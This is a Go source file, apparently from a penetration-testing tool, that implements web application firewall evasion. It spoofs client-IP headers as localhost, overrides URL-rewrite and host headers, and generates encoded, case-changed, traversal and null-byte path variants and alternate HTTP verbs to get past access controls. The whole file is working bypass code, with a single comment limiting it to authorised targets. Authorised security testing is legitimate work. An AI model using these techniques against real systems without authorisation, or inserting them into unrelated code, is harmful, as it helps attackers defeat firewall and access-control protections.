package evasion

import (
	"net/http"
	"strings"
)

// WAFBypassHeaders returns a set of HTTP headers commonly used to bypass
// WAF/firewall path-filtering and access-control checks.
// These probe gaps in IP-trust lists and URL-rewriting rules.
// Use only on authorized targets.
func WAFBypassHeaders(base http.Header) http.Header {
	h := base.Clone()
	if h == nil {
		h = make(http.Header)
	}
	// IP spoofing headers — bypass IP-based access controls
	for _, header := range []string{
		"X-Forwarded-For",
		"X-Real-IP",
		"X-Originating-IP",
		"X-Remote-IP",
		"X-Remote-Addr",
		"X-Client-IP",
		"CF-Connecting-IP",
		"True-Client-IP",
	} {
		h.Set(header, "127.0.0.1")
	}
	// URL rewrite bypass headers
	h.Set("X-Original-URL", "/")
	h.Set("X-Rewrite-URL", "/")
	h.Set("X-Override-URL", "/")

	// Host override — bypass virtual-host restrictions
	h.Set("X-Forwarded-Host", "localhost")
	h.Set("X-Host", "localhost")
	h.Set("X-Forwarded-Server", "localhost")

	return h
}

// PathMutations returns all evasion variants of a path.
// Probes encoding/case/separator variations to bypass naive WAF rules.
func PathMutations(path string) []string {
	base := strings.TrimPrefix(path, "/")
	mutations := []string{path} // original first

	// Case variations
	mutations = append(mutations, "/"+strings.ToUpper(base))

	// URL encoding (first char only — lightweight)
	if len(base) > 0 {
		mutations = append(mutations, "/%"+hexByte(base[0])+base[1:])
	}

	// Double URL encoding
	if len(base) > 0 {
		mutations = append(mutations, "/%25"+hexByte(base[0])+base[1:])
	}

	// Path traversal prefixes
	mutations = append(mutations,
		"/./"+base,
		"//"+base,
		"/"+base+"/",
		"/"+base+"/..",
		"/"+base+";/",
	)

	// Null byte (some WAFs stop processing at null)
	mutations = append(mutations, "/"+base+"%00")

	return dedupStrings(mutations)
}

// VerbTamper returns HTTP method variants to try when WAF blocks specific methods.
func VerbTamper(base string) []string {
	// Sometimes WAFs only block GET/POST; TRACE/HEAD may be allowed and reveal info
	return []string{base, "HEAD", "OPTIONS", "TRACE", "PUT", "PATCH"}
}

func hexByte(b byte) string {
	const hex = "0123456789ABCDEF"
	return string([]byte{hex[b>>4], hex[b&0xf]})
}

func dedupStrings(ss []string) []string {
	seen := make(map[string]bool)
	var out []string
	for _, s := range ss {
		if !seen[s] {
			seen[s] = true
			out = append(out, s)
		}
	}
	return out
}
